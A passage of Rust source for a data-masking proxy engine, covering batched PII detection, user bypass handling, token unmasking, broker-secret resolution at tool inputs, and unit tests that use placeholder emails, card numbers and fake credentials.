                    let token = {
                        let mut store = self.store.lock().expect("store mutex poisoned");
                        store.intern_broker(&d.entity_type, slice, None)?
                    };
                    manifest.push(ManifestEntry {
                        canonical_form: slice.to_string(),
                        token_handle: token.clone(),
                        entity_kind: d.entity_type.clone(),
                        arrow_origin: surface,
                        exposed_at: Some(start..start + token.len()),
                        broker: true,
                        local: false,
                    });
                    token
                }
            };
            out.replace_range(start..end, &replacement);
        }
        Ok((out, manifest))
    }

    /// Batched detection PREWARM — the throughput lever for ML-active turns.
    ///
    /// Given every text leaf of a request (the proxy walker collects them in one
    /// read-only pass), run the EXPENSIVE ML detection for all cache-missing leaves
    /// in a SINGLE batched forward ([`run_detection_batch`] →
    /// [`Recognizer::analyze_batch`](presidio_core::Recognizer::analyze_batch)) and
    /// populate the detection cache. The subsequent per-leaf [`Self::mask`] calls
    /// then all hit cache and pay no per-leaf inference — collapsing N serialized
    /// tiny forwards (each starving the MoE expert pool) into one padded batch that
    /// feeds the cores and amortizes fixed per-call cost.
    ///
    /// PURELY ADDITIVE — it only ever inserts cache entries that [`Self::mask`] would
    /// compute identically for the same `(text_hash, surface, policy_fp, ml_fp)` key
    /// (the key is derived here by the very same [`stripped_for_key`] +
    /// `surface`/`policy_fp`/`ml_fp` logic `mask` uses). So the masked output is
    /// unchanged whether or not this ran. Every leaf it deliberately skips — a
    /// user-bypass leaf, a policy-disabled surface, an already-cached leaf, or the
    /// whole batch on an error — simply runs per-leaf in `mask` exactly as before.
    /// Errors are swallowed (logged): a prewarm failure must NEVER change a request's
    /// outcome; the per-leaf path re-runs and fails safe on its own.
    ///
    /// Gated on a `Ready` ML recognizer: with no ML active there is nothing
    /// expensive to batch (regex/custom detection is cheap and `mask` caches it
    /// per-leaf), so this no-ops. The `ml_gate` is taken ONCE here for the whole
    /// batch — and ONLY ever on a `spawn_blocking` thread, because the proxy offloads
    /// the mask walk whenever ML is `Ready`/`Loading` (invariant #5); the prewarmed
    /// leaves then hit cache in `mask` and never re-take the gate, so there is no
    /// nesting and no double-run.
    pub fn prewarm_batch(&self, leaves: &[(&str, Surface)]) {
        if leaves.is_empty() {
            return;
        }
        // Snapshot policy as a cheap `Arc` clone, then release the lock (audit #2).
        let policy = Arc::clone(&self.policy.read().expect("policy rwlock poisoned"));
        if !policy.config.enabled {
            return; // master switch off ⇒ `mask` early-returns passthrough, no detection
        }
        // Snapshot the registered-secret set (cheap `Arc` clone) alongside the policy,
        // so the prewarmed key space matches the per-leaf `mask` key (which folds in
        // `secrets_fp`) and Pass-0 secrets are detected in the batched path too.
        let secrets = Arc::clone(&self.secrets.read().expect("secrets rwlock poisoned"));
        // Snapshot the ML recognizer + its fingerprint together (atomic across an ML
        // transition, audit #1). `None` unless `Ready` ⇒ nothing worth batching.
        // A strict-mode refusal also means nothing to prewarm — the per-leaf
        // `mask` call is the authoritative refuser. The slot generation is unused
        // here: prewarm NEVER notes runtime failures (its Err arm only logs and
        // falls back to per-leaf), so there is nothing to attribute to a generation.
        let (ml, ml_fp, _generation, refusal) = self.ml_for_mask();
        let (Some(ml), None) = (ml, refusal) else {
            return;
        };

        // Plan: derive each leaf's cache key EXACTLY as `mask` does (surface gate,
        // user-bypass skip, reveal-marker strip), drop the already-cached, and dedupe
        // identical leaves so a repeated tool-result is detected once.
        let mut planned: Vec<(CacheKey, Cow<'_, str>, Surface)> = Vec::new();
        let mut seen: std::collections::HashSet<CacheKey> = std::collections::HashSet::new();
        for &(raw, surface) in leaves {
            // A surface disabled by policy is an un-cached passthrough in `mask` — its
            // key is never read, so don't prewarm it (mirrors `mask`'s early return).
            if !policy.config.surface_enabled(surface) {
                continue;
            }
            // A user-bypass leaf (`>>secret<<`) takes the segment-split path in `mask`
            // and is never keyed on the full text — let it run per-leaf.
            if surface == Surface::UserMessage && user_bypass_segments(raw).is_some() {
                continue;
            }
            let text = stripped_for_key(&policy, raw, surface);
            let key = CacheKey {
                text_hash: hash_text(&text),
                surface,
                policy_fp: policy.policy_fp,
                ml_fp,
                secrets_fp: secrets.secrets_fp,
            };
            if self.cache.get(&key).is_some() {
                continue; // already detected (this turn or a prior one)
            }
            if !seen.insert(key.clone()) {
                continue; // duplicate leaf within this request — detect once
            }
            planned.push((key, text, surface));
        }
        if planned.is_empty() {
            return;
        }

        // Single-flight: hold the ML gate once for the whole batch (recovering a
        // poisoned guard — one panicked inference must not wedge all future masking,
        // matching `mask`). Re-check the cache under the gate so a concurrent
        // request's prewarm/mask can't double-run the same leaf.
        let _gate = self
            .ml_gate
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner);
        let pending: Vec<(CacheKey, Cow<'_, str>, Surface)> = planned
            .into_iter()
            .filter(|(k, _, _)| self.cache.get(k).is_none())
            .collect();
        if pending.is_empty() {
            return;
        }

        // Run the one batched detection, then drop the borrow before consuming `pending`.
        let result = {
            let batch: Vec<(&str, Surface)> =
                pending.iter().map(|(_, t, s)| (t.as_ref(), *s)).collect();
            run_detection_batch(
                &self.analyzer,
                &policy.config,
                &policy.customs,
                &secrets.compiled,
                ml.as_ref(),
                &batch,
            )
        };
        match result {
            Ok(det_lists) => {
                for ((key, _, _), dets) in pending.into_iter().zip(det_lists) {
                    self.cache.insert(key, Arc::new(dets));
                }
            }
            Err(e) => {
                // Per-leaf `mask` will re-run detection (and fail-safe if it genuinely
                // errors). Prewarm is an optimization; never let it change the outcome.
                tracing::warn!("prewarm_batch detection failed, falling back to per-leaf: {e}");
            }
        }
    }

    /// One-shot user-message bypass: `>>secret<<` is sent upstream as `secret`
    /// without detection, token minting, or any future implication. Surrounding text
    /// is still masked normally.
    fn mask_user_bypass(&self, text: &str) -> Result<Option<MaskOutcome>, EngineError> {
        let Some(segments) = user_bypass_segments(text) else {
            return Ok(None);
        };

        let mut masked_text = String::with_capacity(text.len());
        let mut manifest = UnmaskManifest::new();
        let mut stats = MaskStats::default();
        // A registered secret inside a `>>…<<` bypass must NOT egress in plaintext
        // (A9): scan each bypassed segment for registered secrets and mask those
        // spans, leaving the rest of the bypass verbatim. The bypass is a user
        // convenience, not a secret-exfil hatch.
        let secrets = Arc::clone(&self.secrets.read().expect("secrets rwlock poisoned"));
        let policy = Arc::clone(&self.policy.read().expect("policy rwlock poisoned"));

        for segment in segments {
            match segment {
                UserBypassSegment::Mask(s) if !s.is_empty() => {
                    let outcome = self.mask(s, Surface::UserMessage)?;
                    masked_text.push_str(&outcome.masked_text);
                    manifest.merge(outcome.manifest);
                    stats.merge(&outcome.stats);
                }
                UserBypassSegment::Mask(_) => {}
                UserBypassSegment::Bypass(s) => {
                    let dets = if secrets.compiled.is_empty() {
                        Vec::new()
                    } else {
                        resolve_overlaps(detect_secrets(&secrets.compiled, s, Surface::UserMessage))
                    };
                    if dets.is_empty() {
                        masked_text.push_str(s);
                    } else {
                        let (out, m) = self.apply(s, Surface::UserMessage, &policy.config, &dets)?;
                        masked_text.push_str(&out);
                        manifest.merge(m);
                    }
                }
            }
        }

        Ok(Some(MaskOutcome {
            masked_text,
            manifest,
            stats,
        }))
    }

    /// Run detection for a cache miss and (on success) populate the cache. A
    /// detection error is NEVER cached (invariant #2) and always propagates so the
    /// proxy refuses the request rather than forwarding plaintext. This is distinct
    /// from ML `Loading`, where no ML recognizer is active yet and regex-only
    /// detection is the intended successful path.
    ///
    /// `ml_generation` is the slot generation that produced `ml` (from
    /// `ml_for_mask`), threaded through so the runtime-failure note/clear lands on
    /// the recognizer that actually ran — a slow result must not mark a slot that
    /// was reloaded/disabled in the meantime.
    fn detect_and_cache(
        &self,
        policy: &Policy,
        secrets: &[CompiledSecret],
        ml: Option<&dyn ml_api::MlRecognizer>,
        ml_generation: u64,
        text: &str,
        surface: Surface,
        key: CacheKey,
        stats: &mut MaskStats,
    ) -> Result<Arc<Vec<CachedDetection>>, EngineError> {
        if ml.is_some() {
            stats.ml_ran = 1;
        }
        match run_detection(
            &self.analyzer,
            &policy.config,
            &policy.customs,
            secrets,
            ml,
            text,
            surface,
        ) {
            Ok(d) => {
                if ml.is_some() {
                    // The ML pass succeeded — clear any stale runtime-failure note
                    // so status stops reporting an outage that has recovered. Scoped
                    // to `ml_generation` so a slow success can't clear a newer
                    // recognizer's real failure.
                    self.ml_clear_runtime_failure(ml_generation);
                }
                stats.fresh_miss = 1;
                let d = Arc::new(d);
                self.cache.insert(key, Arc::clone(&d));
                Ok(d)
            }
            Err(e) => {
                if ml.is_some() {
                    // Surface the failure in the ML snapshot (status stays `Ready`
                    // — demoting would drop the recognizer and fail OPEN; see
                    // `ml_note_runtime_failure`). Scoped to `ml_generation` so a
                    // slow failure can't mark a slot that was since reloaded.
                    self.ml_note_runtime_failure(ml_generation, &e.to_string());
                }
                tracing::warn!("detection failed, refusing request: {e}");
                Err(e)
            }
        }
    }

    /// Unmask an UNMASK-direction surface (Arrow 2 / Arrow 3). Replaces every known
    /// token with its plaintext (manifest first, then session-store fallback for
    /// tokens minted in earlier turns). Never re-masks; unknown tokens are left
    /// verbatim.
    pub fn unmask(&self, text: &str, manifest: &UnmaskManifest) -> Result<String, EngineError> {
        // Tool-input / compaction / citation path (Arrow 3 + machine context): `Local`
        // ("owner-reveal") tokens are REFUSED here (left verbatim) unless promoted.
        self.unmask_inner(text, manifest, None, false)
    }

    /// Unmask assistant prose (Arrow 2 → display) and, when the live config's
    /// [`RevealMarker`] is active, wrap each value we actually un-masked with the
    /// marker so the operator can see which spans were restored. ONLY for
    /// `Surface::AssistantText` — tool inputs / results / citations / compaction
    /// must use [`Self::unmask`] so their bytes stay exact. A value left verbatim
    /// (unknown token) is never wrapped.
    pub fn unmask_assistant(
        &self,
        text: &str,
        manifest: &UnmaskManifest,
    ) -> Result<String, EngineError> {
        let policy = Arc::clone(&self.policy.read().expect("policy rwlock poisoned"));
        let marker = &policy.config.reveal_marker;
        // Display path (Arrow 2 → the user): `Local` ("owner-reveal") tokens ARE revealed
        // here so the user sees their own value (e.g. the monitor URL the model relays).
        self.unmask_inner(text, manifest, marker.is_active().then_some(marker), true)
    }

    /// Strip the terminal reveal-marker decoration from already-unmasked assistant
    /// text. The DECORATED copy still reaches the user's client (their in-conversation
    /// unmask insight); this yields the CLEAN reply for the monitor capture. That clean
    /// form is also what lets a captured reply fold out of the next turn's delta — its
    /// egress form then matches the re-masked re-send (the decorated bytes never would).
    /// A no-op (borrow-free clone) when the marker is inactive or absent from `text`.
    pub fn strip_reveal_marker(&self, text: &str) -> String {
        let policy = Arc::clone(&self.policy.read().expect("policy rwlock poisoned"));
        let marker = &policy.config.reveal_marker;
        if marker.is_active() && marker.contained_in(text) {
            marker.strip(text)
        } else {
            text.to_string()
        }
    }

    /// Shared unmask body. With `marker = Some`, each successfully-resolved value is
    /// wrapped for display; unknown tokens pass through untouched (so nothing fake is
    /// ever decorated).
    fn unmask_inner(
        &self,
        text: &str,
        manifest: &UnmaskManifest,
        marker: Option<&RevealMarker>,
        // True ONLY on the display path (`unmask_assistant`): reveal `Local` ("owner-
        // reveal") tokens. False everywhere else (tool input / compaction / citation),
        // where a `Local` token is refused unless its handle was promoted this session.
        reveal_local: bool,
    ) -> Result<String, EngineError> {
        let store = self.store.lock().expect("store mutex poisoned");
        let re = token_regex();
        let mut out = String::with_capacity(text.len());
        let mut last = 0;
        for m in re.find_iter(text) {
            out.push_str(&text[last..m.start()]);
            let tok = m.as_str();
            // BROKER tokens are NEVER resolved on the display path — refuse by prefix
            // BEFORE any manifest/store lookup (a broker `ManifestEntry` carries the
            // secret value as `canonical_form`, so a lookup here would leak it). The
            // value reaches only the tool-input boundary (Phase 4). The store's
            // `reveal` is also PII-kind-gated as a second layer.
            if is_broker_token(tok) {
                out.push_str(tok);
                last = m.end();
                continue;
            }
            // LOCAL ("owner-reveal") tokens: within-turn the manifest entry's `local`
            // flag is authoritative; cross-turn fall back to the store kind. On the
            // tool/non-display path they are refused (left verbatim) unless the handle
            // was promoted for the session — mirroring the broker tool-deny, but with the
            // display path allowed.
            let mentry = manifest.entries.iter().find(|e| e.token_handle == tok);
            let is_local = mentry.map_or_else(|| store.is_local(tok), |e| e.local);
            if is_local && !reveal_local && !store.is_tool_promoted(tok) {
                out.push_str(tok);
                last = m.end();
                continue;
            }
            // Resolve to plaintext (manifest first, then the cross-turn store); only a
            // genuine resolution is wrapped — an unknown token stays verbatim. A `Local`
            // token resolves cross-turn via the kind-gated `reveal_for`.
            let plain = mentry.map(|e| e.canonical_form.clone()).or_else(|| {
                store
                    .reveal(tok)
                    .or_else(|| store.reveal_for(tok, TokenKind::Local).map(|r| r.value))
            });
            match (plain, marker) {
                (Some(p), Some(mk)) => out.push_str(&mk.wrap(&p)),
                (Some(p), None) => out.push_str(&p),
                (None, _) => out.push_str(tok),
            }
            last = m.end();
        }
        out.push_str(&text[last..]);
        drop(store);

        // Custom literal tokens that don't match the standard token grammar.
        for e in &manifest.entries {
            // Never reveal a broker value on the display path; a `local` custom literal
            // (none today — `Local` mints standard-grammar tokens) is likewise skipped
            // here so it can never bypass the surface-aware gate above.
            if e.broker || e.local {
                continue;
            }
            if !re.is_match(&e.token_handle) {
                let replacement = match marker {
                    Some(mk) => mk.wrap(&e.canonical_form),
                    None => e.canonical_form.clone(),
                };
                out = out.replace(&e.token_handle, &replacement);
            }
        }
        Ok(out)
    }

    /// Reveal a single token to its plaintext (audit). `None` if unknown.
    pub fn reveal(&self, token: &str) -> Option<String> {
        self.store
            .lock()
            .expect("store mutex poisoned")
            .reveal(token)
    }

    /// Class-aware audit reveal: like [`Self::reveal`] but distinguishes a genuinely unknown
    /// handle from one that EXISTS but isn't revealable here (a broker secret). Pii/Local
    /// return the plaintext; Broker returns only the registered NAME (its value is resolved
    /// solely at the tool boundary); Unknown means no live token by that handle. The broker
    /// value is NEVER decrypted — `class_of` peeks the kind + name without touching plaintext.
    pub fn reveal_audit(&self, token: &str) -> RevealAudit {
        let store = self.store.lock().expect("store mutex poisoned");
        match store.class_of(token) {
            None => RevealAudit::Unknown,
            Some((TokenKind::Broker, secret_name)) => RevealAudit::Broker { secret_name },
            Some((TokenKind::Pii, _)) => {
                store.reveal(token).map_or(RevealAudit::Unknown, RevealAudit::Pii)
            }
            Some((TokenKind::Local, _)) => store
                .reveal_for(token, TokenKind::Local)
                .map_or(RevealAudit::Unknown, |r| RevealAudit::Local(r.value)),
        }
    }

    /// Promote a `Local` ("owner-reveal") token handle for SESSION tool-input use — the
    /// operator's "allow this value into tool inputs" action. After this, the tool-input
    /// unmask resolves the handle (instead of refusing it) for the rest of the session;
    /// never persisted. Scaffolding for the deferred monitor promote UI — no reachable
    /// caller wires it yet, so by default every `Local` token stays tool-denied.
    pub fn promote_token(&self, token: &str) {
        self.store
            .lock()
            .expect("store mutex poisoned")
            .promote(token);
    }

    /// Session-wide `Local` ("owner-reveal") `(plaintext, handle)` pairs, for the monitor
    /// capture scrub. A `Local` value is revealed on the display path, so it can surface in
    /// a captured reply CROSS-TURN (no `local` manifest entry that turn); re-masking against
    /// this set keeps the admin key out of the persisted monitor record. The proxy seeds the
    /// monitor with this when the reserved admin-key rule (and any future Local secret) installs.
    pub fn local_redaction_pairs(&self) -> Vec<(String, String)> {
        self.store
            .lock()
            .expect("store mutex poisoned")
            .local_pairs()
    }

    /// Export the session key + salt so a sibling process can decrypt for audit.
    pub fn session_handle(&self) -> ([u8; 32], [u8; 16]) {
        let store = self.store.lock().expect("store mutex poisoned");
        (*store.key(), *store.salt())
    }
}

/// Resolve the cache-key text for a leaf: peel a reveal-marker decoration off
/// re-sent assistant history so detection sees the original value and the key
/// matches a no-marker round-trip. Returns a borrowed [`Cow`] for the common
/// (un-decorated) leaf, allocating only when a marker is actually stripped.
///
/// SHARED by [`MaskEngine::mask`] and [`MaskEngine::prewarm_batch`]: deriving the
/// key text from one place is what guarantees a prewarmed entry is found by the
/// later per-leaf `mask` (a divergence here would silently bypass the prewarm —
/// perf, not correctness, but still the thing to keep honest).
fn stripped_for_key<'a>(policy: &Policy, text: &'a str, surface: Surface) -> Cow<'a, str> {
    if surface == Surface::AssistantText
        && policy.config.reveal_marker.is_active()
        && policy.config.reveal_marker.contained_in(text)
    {
        Cow::Owned(policy.config.reveal_marker.strip(text))
    } else {
        Cow::Borrowed(text)
    }
}

/// Outcome of [`MaskEngine::broker_resolve_pointers`]: how many broker tokens were
/// resolved, and the per-pointer denials (reason only — never a value).
#[derive(Clone, Debug, Default)]
pub struct BrokerResolveReport {
    pub resolved: usize,
    pub denied: Vec<(String, DenyReason)>,
}

/// Recursively walk a tool-input JSON value, resolving allowed broker tokens in each
/// string leaf (tracking the RFC-6901 `pointer`).
fn broker_walk(
    v: &mut serde_json::Value,
    pointer: &mut String,
    tool: &str,
    policy: &BrokerPolicy,
    store: &SessionStore,
    report: &mut BrokerResolveReport,
) {
    use serde_json::Value;
    match v {
        Value::String(s) => {
            if let Some(new) = broker_resolve_leaf(s, tool, pointer, policy, store, report) {
                *s = new;
            }
        }
        Value::Array(arr) => {
            for (i, item) in arr.iter_mut().enumerate() {
                let len = pointer.len();
                pointer.push('/');
                pointer.push_str(&i.to_string());
                broker_walk(item, pointer, tool, policy, store, report);
                pointer.truncate(len);
            }
        }
        Value::Object(map) => {
            for (k, item) in map.iter_mut() {
                let len = pointer.len();
                pointer.push('/');
                pointer.push_str(&rfc6901_escape(k));
                broker_walk(item, pointer, tool, policy, store, report);
                pointer.truncate(len);
            }
        }
        _ => {}
    }
}

/// RFC-6901 token escaping: `~` → `~0`, `/` → `~1`.
fn rfc6901_escape(k: &str) -> String {
    k.replace('~', "~0").replace('/', "~1")
}

/// Resolve allowed broker tokens in a single string leaf. Returns the rewritten leaf
/// (with allowed tokens spliced to their values) or `None` if nothing changed. The
/// policy decision uses the ORIGINAL leaf (so the destination host is parsed before
/// any substitution).
fn broker_resolve_leaf(
    leaf: &str,
    tool: &str,
    pointer: &str,
    policy: &BrokerPolicy,
    store: &SessionStore,
    report: &mut BrokerResolveReport,
) -> Option<String> {
    let re = token_regex();
    let mut subs: Vec<(std::ops::Range<usize>, String)> = Vec::new();
    let mut saw_broker = false;
    for m in re.find_iter(leaf) {
        let tok = m.as_str();
        if !is_broker_token(tok) {
            continue;
        }
        saw_broker = true;
        match store.reveal_for(tok, TokenKind::Broker) {
            Some(rev) => {
                let name = rev.secret_name.as_deref().unwrap_or("");
                match policy.decide(name, tool, pointer, leaf) {
                    BrokerDecision::Resolve => {
                        subs.push((m.range(), rev.value));
                        report.resolved += 1;
                    }
                    BrokerDecision::Deny(reason) => {
                        report.denied.push((pointer.to_string(), reason));
                    }
                }
            }
            // Unknown / expired / tombstoned broker token: leave it, count as denied.
            None => report
                .denied
                .push((pointer.to_string(), DenyReason::NoRule)),
        }
    }
    if !saw_broker || subs.is_empty() {
        return None;
    }
    // Splice back-to-front so earlier byte ranges stay valid.
    subs.sort_by(|a, b| b.0.start.cmp(&a.0.start));
    let mut out = leaf.to_string();
    for (range, value) in subs {
        out.replace_range(range, &value);
    }
    Some(out)
}

/// Widen `[start, end)` outward to the nearest UTF-8 char boundaries (and clamp to
/// `text.len()`), so slicing/splicing can never panic on a stray non-boundary
/// detector offset. A no-op for the normal (already-aligned) case.
fn snap_to_char_boundary(text: &str, start: usize, end: usize) -> (usize, usize) {
    let mut start = start.min(text.len());
    let mut end = end.min(text.len()).max(start);
    while start > 0 && !text.is_char_boundary(start) {
        start -= 1;
    }
    while end < text.len() && !text.is_char_boundary(end) {
        end += 1;
    }
    (start, end)
}

/// `Mask` operator: keep the last `from_end` chars, replace the rest with `ch`.
fn mask_value(slice: &str, ch: char, from_end: usize) -> String {
    let chars: Vec<char> = slice.chars().collect();
    let n = chars.len();
    let keep = from_end.min(n);
    let mut s = String::with_capacity(slice.len());
    for _ in 0..(n - keep) {
        s.push(ch);
    }
    for c in &chars[n - keep..] {
        s.push(*c);
    }
    s
}

#[derive(Debug, PartialEq, Eq)]
enum UserBypassSegment<'a> {
    Mask(&'a str),
    Bypass(&'a str),
}

fn user_bypass_segments(text: &str) -> Option<Vec<UserBypassSegment<'_>>> {
    const START: &str = ">>";
    const END: &str = "<<";

    let mut segments = Vec::new();
    let mut cursor = 0;
    let mut matched = false;

    while let Some(rel_start) = text[cursor..].find(START) {
        let start = cursor + rel_start;
        let inner_start = start + START.len();
        let Some(rel_end) = text[inner_start..].find(END) else {
            break;
        };
        let end = inner_start + rel_end;

        segments.push(UserBypassSegment::Mask(&text[cursor..start]));
        segments.push(UserBypassSegment::Bypass(&text[inner_start..end]));
        cursor = end + END.len();
        matched = true;
    }

    if !matched {
        return None;
    }

    segments.push(UserBypassSegment::Mask(&text[cursor..]));
    Some(segments)
}

// Engine must be shareable across async tasks in the proxy.
const _: fn() = || {
    fn assert_send_sync<T: Send + Sync>() {}
    assert_send_sync::<MaskEngine>();
};

#[cfg(test)]
mod tests {
    use super::*;

    fn engine() -> MaskEngine {
        MaskEngine::new(EngineConfig::default()).unwrap()
    }

    // T1 — mask -> unmask round-trip.
    #[test]
    fn round_trip_email() {
        let e = engine();
        let original = "contact me at alice@example.com please";
        let outcome = e.mask(original, Surface::UserMessage).unwrap();
        assert!(!outcome.masked_text.contains("alice@example.com"));
        assert!(outcome.masked_text.contains("[EMAIL_ADDRESS_"));
        let back = e.unmask(&outcome.masked_text, &outcome.manifest).unwrap();
        assert_eq!(back, original);
    }

    // T2 — determinism / cache stability.
    #[test]
    fn determinism_same_engine() {
        let e = engine();
        let a = e
            .mask("write to carol@example.com", Surface::UserMessage)
            .unwrap();
        let b = e
            .mask("write to carol@example.com", Surface::ToolResult)
            .unwrap();
        assert!(
            a.masked_text.contains("[EMAIL_ADDRESS_"),
            "got: {}",
            a.masked_text
        );
        assert_eq!(
            a.masked_text, b.masked_text,
            "same plaintext => identical token"
        );
    }

    #[test]
    fn determinism_shared_salt_vs_isolation() {
        let key = [7u8; 32];
        let salt = [9u8; 16];
        let e1 = MaskEngine::with_session(EngineConfig::default(), key, salt).unwrap();
        let e2 = MaskEngine::with_session(EngineConfig::default(), key, salt).unwrap();
        let t1 = e1.mask("alice@example.com", Surface::UserMessage).unwrap();
        let t2 = e2.mask("alice@example.com", Surface::UserMessage).unwrap();
        assert_eq!(
            t1.masked_text, t2.masked_text,
            "same (key,salt) => same token"
        );

        let e3 = MaskEngine::with_session(EngineConfig::default(), key, [1u8; 16]).unwrap();
        let t3 = e3.mask("alice@example.com", Surface::UserMessage).unwrap();
        assert_ne!(
            t1.masked_text, t3.masked_text,
            "different salt => different token"
        );
    }

    // T3 — reveal.
    #[test]
    fn reveal_token() {
        let e = engine();
        let outcome = e.mask("alice@example.com", Surface::UserMessage).unwrap();
        let token = outcome.manifest.entries[0].token_handle.clone();
        assert_eq!(e.reveal(&token).as_deref(), Some("alice@example.com"));
        assert_eq!(e.reveal("[EMAIL_ADDRESS_deadbeef0000]"), None);
    }

    // T4 — operator coverage.
    #[test]
    fn operators() {
        let mut cfg = EngineConfig::default();
        cfg.entity_operators.insert(
            "CREDIT_CARD".into(),
            Operator::Mask {
                char: '*',
                from_end: 4,
            },
        );
        cfg.entity_operators
            .insert("EMAIL_ADDRESS".into(), Operator::Redact);
        let e = MaskEngine::new(cfg).unwrap();

        let out = e
            .mask("card 4111111111111111 here", Surface::UserMessage)
            .unwrap();
        assert!(out.masked_text.contains("************1111"));
        assert!(out.manifest.is_empty(), "Mask produces no reversible entry");

        let out2 = e
            .mask("mail bob@example.com", Surface::UserMessage)
            .unwrap();
        assert!(out2.masked_text.contains("[REDACTED]"));
        assert!(!out2.masked_text.contains("bob@example.com"));
        // Unmasking redacted text is a no-op.
        let back = e.unmask(&out2.masked_text, &out2.manifest).unwrap();
        assert_eq!(back, out2.masked_text);
    }

    // T5 — allow-list + custom rules.
    #[test]
    fn allow_list_and_custom() {
        let mut cfg = EngineConfig::default();
        cfg.allow_list.add_exact("admin@example.com");
        cfg.custom_replacements.push(CustomReplacement {
            pattern: "ACME-CODENAME".into(),
            entity_type: "CODENAME".into(),
            is_regex: false,
            case_sensitive: true,
            priority: 0,
            literal_token: true,
            token: Some("[CODENAME_acme]".into()),
            apply_to_surfaces: None,
        });
        let e = MaskEngine::new(cfg).unwrap();

        let out = e
            .mask(
                "ping admin@example.com about ACME-CODENAME",
                Surface::UserMessage,
            )
            .unwrap();
        assert!(
            out.masked_text.contains("admin@example.com"),
            "allow-listed not masked"
        );
        assert!(out.masked_text.contains("[CODENAME_acme]"));
        let back = e.unmask(&out.masked_text, &out.manifest).unwrap();
        assert_eq!(back, "ping admin@example.com about ACME-CODENAME");
    }

    #[test]
    fn user_message_bypass_removes_markers_and_skips_masking() {
        let e = engine();
        let out = e
            .mask(
                "send >>bob@example.com<< and cc alice@example.com",
                Surface::UserMessage,
            )
            .unwrap();

        assert!(out.masked_text.contains("bob@example.com"));
        assert!(!out.masked_text.contains(">>"));
        assert!(!out.masked_text.contains("<<"));
        assert!(!out.masked_text.contains("alice@example.com"));
        assert_eq!(out.manifest.len(), 1);
        assert_eq!(
            e.unmask(&out.masked_text, &out.manifest).unwrap(),
            "send bob@example.com and cc alice@example.com"
        );
    }

    #[test]
    fn user_message_bypass_has_no_future_effect() {
        let e = engine();
        let first = e
            .mask("send >>bob@example.com<<", Surface::UserMessage)
            .unwrap();
        assert_eq!(first.masked_text, "send bob@example.com");
        assert!(first.manifest.is_empty());

        let second = e
            .mask("send bob@example.com", Surface::UserMessage)
            .unwrap();
        assert!(!second.masked_text.contains("bob@example.com"));
        assert_eq!(second.manifest.len(), 1);
    }

    #[test]
    fn bypass_syntax_is_user_message_only() {
        let e = engine();
        let out = e
            .mask("system >>bob@example.com<<", Surface::SystemPrompt)
            .unwrap();

        assert!(!out.masked_text.contains("bob@example.com"));
        assert!(out.masked_text.contains(">>"));
        assert!(out.masked_text.contains("<<"));
        assert_eq!(out.manifest.len(), 1);
    }

    // presidio's strict UrlRecognizer drops scheme-less filenames/code
    // (`CLAUDE.md`, `opts.la`) while still masking real URLs. URL lives in the
    // `Network` category (OFF in the default Balanced profile), so this test enables
    // it explicitly to exercise the recognizer.
    #[test]
    fn strict_url_skips_filenames_keeps_real_urls() {
        let mut cfg = EngineConfig::default();
        cfg.enabled_categories.insert(Category::Network);
        let e = MaskEngine::new(cfg).unwrap();
        let text = "edit CLAUDE.md and opts.la then open https://corp.example.com/secret and mail bob@example.com";
        let out = e.mask(text, Surface::UserMessage).unwrap();
        assert!(
            out.masked_text.contains("CLAUDE.md"),
            "filename masked: {}",
            out.masked_text
        );
        assert!(
            out.masked_text.contains("opts.la"),
            "code ident masked: {}",
            out.masked_text
        );
        assert!(
            !out.masked_text.contains("https://corp.example.com/secret"),
            "real URL not masked: {}",
            out.masked_text
        );
        assert!(!out.masked_text.contains("bob@example.com"));
        assert!(out.masked_text.contains("[URL_"));
        assert!(out.masked_text.contains("[EMAIL_ADDRESS_"));
    }

    // Taxonomy: Network is its own category holding the infra identifiers; Contact
    // keeps only the person-reachable PII. Locks the split so a future edit can't
    // silently fold URL/IP back into Contact (which would re-enable them by default).
    #[test]
    fn network_category_split_membership() {
        assert_eq!(Category::ALL.len(), 6, "Network must be a distinct category");
        let net = Category::Network.entity_types();
        for e in ["IP_ADDRESS", "URL", "MAC_ADDRESS"] {
            assert!(net.contains(&e), "Network must list {e}");
        }
        let contact = Category::Contact.entity_types();
        assert_eq!(contact, &["EMAIL_ADDRESS", "PHONE_NUMBER"]);
        for e in ["IP_ADDRESS", "URL", "MAC_ADDRESS"] {
            assert!(!contact.contains(&e), "Contact must NOT list {e} anymore");
        }
    }

    // Default (Balanced) profile: infra identifiers pass through verbatim (model keeps
    // the context) while person-PII still masks. The whole point of the Network split.
    #[test]
    fn balanced_default_passes_network_masks_contact() {
        let e = engine();
        let text =
            "GET https://api.example.com/v1/x from 192.168.1.5 (also 0.0.0.0:3000); ping bob@example.com";
        let out = e.mask(text, Surface::UserMessage).unwrap();
        // Infra: untouched.
        assert!(
            out.masked_text.contains("https://api.example.com/v1/x"),
            "URL must pass through at Balanced: {}",
            out.masked_text
        );
        assert!(
            out.masked_text.contains("192.168.1.5"),
            "IP must pass through at Balanced: {}",
            out.masked_text
        );
        assert!(!out.masked_text.contains("[URL_"));
        assert!(!out.masked_text.contains("[IP_ADDRESS_"));
        // Person-PII: still masked.
        assert!(!out.masked_text.contains("bob@example.com"));
        assert!(out.masked_text.contains("[EMAIL_ADDRESS_"));
    }

    // The crux of the Network split: at the DEFAULT profile (Network OFF, so the URL
    // itself is NOT masked), an opaque credential *inside* a URL — one with no
    // recognizable secret shape — is still masked, while the surrounding URL structure
    // survives verbatim. Covers query-param values and userinfo.
    #[test]
    fn in_url_credential_masked_at_default_while_url_survives() {
        let e = engine();
        let text = "curl https://api.example.com/v1/users?token=hunter2opaquevalue&id=42 \
                    and pg postgres://admin:s3cr3tPw0rd@db.example.com/app";
        let out = e.mask(text, Surface::UserMessage).unwrap();

        // Opaque param credential gone; URL host/path/other-params survive.
        assert!(
            !out.masked_text.contains("hunter2opaquevalue"),
            "opaque ?token= value must be masked: {}",
            out.masked_text
        );
        assert!(out.masked_text.contains("[URL_CREDENTIAL_"));
        assert!(
            out.masked_text.contains("https://api.example.com/v1/users?token="),
            "URL structure up to the credential must survive: {}",
            out.masked_text
        );
        assert!(
            out.masked_text.contains("&id=42"),
            "benign trailing param must survive: {}",
            out.masked_text
        );
        // URL itself NOT tokenized (Network off).
        assert!(!out.masked_text.contains("[URL_]"));
        assert!(!out.masked_text.contains("[URL_0"));

        // Userinfo password gone; scheme + host + path survive.
        assert!(
            !out.masked_text.contains("s3cr3tPw0rd") && !out.masked_text.contains("admin:s3cr3tPw0rd"),
            "userinfo credential must be masked: {}",
            out.masked_text
        );
        assert!(
            out.masked_text.contains("@db.example.com/app"),
